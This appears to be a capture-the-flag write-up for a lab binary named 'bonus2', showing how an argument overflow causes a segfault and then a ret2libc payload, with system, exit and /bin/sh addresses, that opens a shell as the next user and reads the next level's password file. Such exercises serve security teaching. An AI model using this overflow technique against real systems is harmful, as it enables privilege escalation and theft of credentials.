# Level 2

We have a program who takes two arguments and :
```sh
$ ./bonus2 
$ ./bonus2 42
$ ./bonus2 42 42
Hello 42
```

We can make the program SEGFAULT by playing with values
```sh
$ ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 25)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB

$./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 26)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
```

Like, the exercice 2 we have to find some addresses:

```sh
$ export HACK=/bin/sh
$ /tmp/genv HACK ./bonus2
HACK will be at 0xbffff926
```

system address:   0xb7e6b060
exit address:     0xb7e5ebe0
/bin/sh address:  0xbffff926

```sh
(LANG=fi; ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("B" * 18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x26\xf9\xff\xbf")'); cat)
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����&���
$ whoami
bonus3
$ cat /home/user/bonus4/.pass
```